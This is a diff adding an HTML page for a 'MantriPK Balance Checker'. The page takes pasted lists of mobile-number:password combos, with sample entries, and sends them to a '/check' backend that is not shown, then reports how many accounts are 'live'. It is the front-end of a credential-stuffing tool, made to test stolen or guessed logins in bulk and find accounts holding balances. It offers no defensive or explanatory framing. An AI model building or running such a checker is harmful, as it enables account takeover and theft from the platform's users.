@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MantriPK Checker</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 20px; }
+        h1 { color: #28a745; }
+        textarea { width: 100%; height: 400px; padding: 10px; font-family: monospace; }
+        button { padding: 15px 30px; font-size: 18px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        button:hover { background: #218838; }
+        #result { margin-top: 20px; padding: 15px; background: white; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <h1>MantriPK Balance Checker</h1>
+    <textarea id="combos" placeholder="Mobile:Password\n917053735397:yourpassword\n917053735398:pass123\n..."></textarea><br><br>
+    <button onclick="startCheck()">🚀 Start Checking</button>
+    <div id="result"></div>
+
+    <script>
+    function startCheck() {
+        const combos = document.getElementById('combos').value;
+        document.getElementById('result').innerHTML = "<p>Checking started... Please wait</p>";
+
+        fetch('/check', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({combos: combos})
+        })
+        .then(res => res.json())
+        .then(data => {
+            let html = `<h3>✅ Checking Complete!</h3>`;
+            html += `<p>Live Accounts: <strong>${data.live}</strong> / ${data.total}</p>`;
+            document.getElementById('result').innerHTML = html;
+        })
+        .catch(err => {
+            document.getElementById('result').innerHTML = "<p style='color:red'>Error occurred</p>";
+        });
+    }
+    </script>
+</body>
+</html>
